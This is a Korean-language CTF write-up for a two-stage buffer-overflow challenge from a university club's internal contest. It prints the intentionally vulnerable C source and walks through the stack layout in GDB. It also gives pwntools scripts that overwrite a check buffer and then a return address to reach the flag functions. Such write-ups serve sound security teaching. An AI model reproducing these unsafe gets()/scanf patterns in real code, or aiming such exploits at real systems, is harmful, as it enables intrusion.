---
layout: post
title: "[JFS] bof_world"
excerpt_separator: <!--more-->
tags: [JFS_5TH, CTF, PWNABLE, Write-Up]
comment: true
---

### JFS란?
	ARGOS 내부 해킹 대회

***

평소에 관심이 많았던 bof문제였으나, 생각보다 고전해서 겨울방학 때 더 공부하고 싶다.

<!--more-->

bof_world는 2문제가 이어져있다.



### phase_1

***



![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/00.PNG)

50점이다. 간단한 버퍼오버플로우인데, [pwntools](https://github.com/Gallopsled/pwntools) 를 이용하면 쉽게 풀 수 있다.



![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/01.PNG)

`bof_world.zip` 가 첨부되어 있고, nc할 수 있는 주소가 나와있다.

> 동아리 내부망에서만 접속 가능하다.



압축파일을 확인해보면

![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/02.PNG)



소스코드(!)와, 바이너리가 같이 있다.



소스코드를 확인해보자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void flag2() {
    char flag[100];
    puts("Wow! You find 2nd stage!!");
    puts("Now you can control PC");
    FILE *fp = fopen("flag2.txt", "r");
    fgets(flag, 0x100, fp);
    fclose(fp);
    printf("Here is 2nd Flag! : %s\n", flag);
}

void flag1() {
	char comment[8];
	char flag[0x100];
    puts("Okay, now you understand Buffer Overflow!");
    FILE *fp = fopen("flag1.txt", "r");
    fgets(flag, 0x100, fp);
    fclose(fp);
    printf("Here is Flag! : %s\n", flag);
	sleep(1);
	
	while(getchar()!='\n');
	printf("Leave a comment : ");
	gets(comment);
}

void bof() {
    char check[16] = "\x66\x55\x44\x33\x22\x11";
    char buffer[8];
	sleep(1);
	puts("==================================");
    puts("Welcome to the BOF world!");
    puts("Give me some bytes");
    scanf("%24s", buffer);

    if (memcmp(check, "\x11\x22\x33\x44\x55\x66", 6) == 0)
        flag1();

    puts("Thx~ :)");
}

int main() {
    int i;
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    puts("This is for baby pwnner");
    puts("Do you know BOF?");
    puts("Let's learn about it!\n");
    bof();
    return 0;
}
```



함수의 흐름은 다음과 같다.

1. `main` 에서 `bof()` 를 호출한다.
2. `bof()` 에서는 `buffer` 에 최대 24자만큼 입력한다.
   *  이 때, `buffer` 에는 `buffer` 의 크기 8byte와, SFP(Stack Frame Pointer) 8byte, 덮어 쓸 6byte("\x11\x22\x33\x33\x44\x55\x66")를 입력해야 한다.
3. `check` 에 `\x11\x22\x33\x44\x55\x66` 이 저장되어 있으면 `flag1()` 가 호출되어 서버에서부터 flag가 출력된다.



처음엔 쉘에서 바로 주소를 입력하려 했으나, 스크립트 언어를 통하지 않고는 불가능하다는 포스팅을 봤다.

그래서 평소에 자주 접했던 `pwntools` 을 사용했다.



#### PayLoad

```py
from pwn import *
  
p = remote("168.188.123.207", 16164)
pr = p.recvuntil("Let's learn about it!\n")
print pr
sleep(1)
pr = p.recvuntil("Give me some bytes")
print pr
p.sendline("a"*16+"\x11\x22\x33\x44\x55\x66") #혹은 pwntools에서 지원하는 packing을 이용해도 좋다.
#p.sendline("a"*16 + p64(0x665544332211)) #little endian, 64비트 환경
pr = p.recvuntil("}")
print pr
```

![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/04.PNG)



phase_1을 클리어했다.

### phase_2
***

`flag1()` 을 bof를 통해 무사히 호출했으므로, `flag2()` 를 찾아보자.

`flag2()` 는 `flag1()` 과 이어져있다.



```c
void flag2() {
    char flag[100];
    puts("Wow! You find 2nd stage!!");
    puts("Now you can control PC");
    FILE *fp = fopen("flag2.txt", "r");
    fgets(flag, 0x100, fp);
    fclose(fp);
    printf("Here is 2nd Flag! : %s\n", flag);
}

void flag1() {
	char comment[8];
	char flag[0x100];
    puts("Okay, now you understand Buffer Overflow!");
    FILE *fp = fopen("flag1.txt", "r");
    fgets(flag, 0x100, fp);
    fclose(fp);
    printf("Here is Flag! : %s\n", flag);
	sleep(1);
	
	while(getchar()!='\n');
	printf("Leave a comment : ");
	gets(comment);
}
```



`flag1()` 에서 sleep(1)한 이후에, while문을 통해 `\n(엔터)` 을 입력 받을 때 까지 `gets(comment)` 함을 볼 수 있다.

즉, `flag2()` 는 `flag1()` 의 `comment`를 버퍼 오버플로우 함으로써 호출할 수 있는 것이다.



이는 `flag1()` 과 비슷하지만 이번엔 메모리 구조의 `RET` 영역을 수정해야 한다.

#### RET ?

> RET 영역은 함수의 동작이 끝난 후, 다시 caller에게 복귀하기 위한 주소가 저장되어 있는 장소로서, RET 영역에 대한 변조를 통해 사용자가 임의로 프로그램의 흐름과 다른 메모리로 jump할 수 있다.

정리하자면 phase_2의 공격 순서는 다음과 같다.

1. `comment` 에 8byte, SFP를 덮기 위한 8byte, `flag2()` 의 시작주소 8byte를 입력한다.
   * 시작 주소는 GDB Debugger를 통한 동적 디버깅으로 확인한다.
   * ![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/05.PNG)
2. `flag2()` 가 호출되면서 서버에 저장되어 있는 `flag2.txt` 를 읽어온다.
3. CLEAR!

우선 RET영역에 대한 이해를 돕기 위해 그림을 통해 나타내자면, 위 프로그램에서 메모리 구조는 다음과 같이 생겼다.

![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/06.PNG)




아니, 생겼을 줄 알았다. `comment` 영역을 16byte만큼 덮은 다음, `flag2()` 의 시작 주소를 RET 영역에 덮으면 해결될 줄 알았으나, 안되었다. 왜 안되는지는 GDB 를 통해 확인해보자.



![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/08.PNG)

지금 보이는 어셈블리어들은 `gets(comment)` 에 대한 부분이다. 자세히 보면 `comment` 가 `rbp-0x10` 에 위치하는 것을 볼 수 있다. 이는 위의 공격 순서처럼 공격할 때에 조건은 `comment` 가 스택의 top에 있다는 전제였는데, `comment` 의 크기는 8byte이므로 `rbp-0x8` 부터 `rbp-0x10` 에 존재하는 것이다. 즉 10진수로는 

`rbp-8`  ~ `rbp-16` 사이에 있는 것인데, `rbp` ~ `rbp-8` 에는 무엇이 있을까.



![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/09.PNG)

바로 fopen에 사용된 `fp` 였다.



현재 메모리의 상태는 

![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/06.PNG)

이 아니라



![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/07.PNG)

의 상태인 것이다.



자, 다시 공격순서를 정리 해보자.

1. `comment` 에 8byte, `fp` 를 덮기 위한 8byte, SFP를 덮기 위한 8byte, 총 24byte를 덮고 나서야 `flag2()` 의 시작주소 8byte를 입력해야한다.
   * 시작 주소는 GDB Debugger를 통한 동적 디버깅으로 확인한다.
   * ![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/05.PNG)
2. `flag2()` 가 호출되면서 서버에 저장되어 있는 `flag2.txt` 를 읽어온다.
3. CLEAR!



phase_1과 합쳐진 Payload는 다음과 같다.

#### Payload

```py
from pwn import *
  
p = remote("168.188.123.207", 16164)
pr = p.recvuntil("Let's learn about it!\n")
print pr
sleep(1)
pr = p.recvuntil("Give me some bytes")
print pr
p.sendline("a"*16+p64(0x665544332211));
#p.sendline("a"*16+"\x11\x22\x33\x44\x55\x66")
pr = p.recvuntil("}") #phase_1 CLEAR!
print pr
pr = p.recvuntil("Leave a comment : ")
print pr
sleep(1)
p.sendline("A"*24+p64(0x400896)) #phase_2 CLEAR!
p.interactive(); #상호작용모드? 서버로 부터 정보를 받고 보낼 수 있음. 여기선 recv 대신 사용함
```



![]({{site.baseurl}}/images/2018-12-09-JFS-bof_world/10.PNG)



1, 2 합쳐서 150점 획득! (phase_2는 대회가 종료된 후 풀었지만😂)
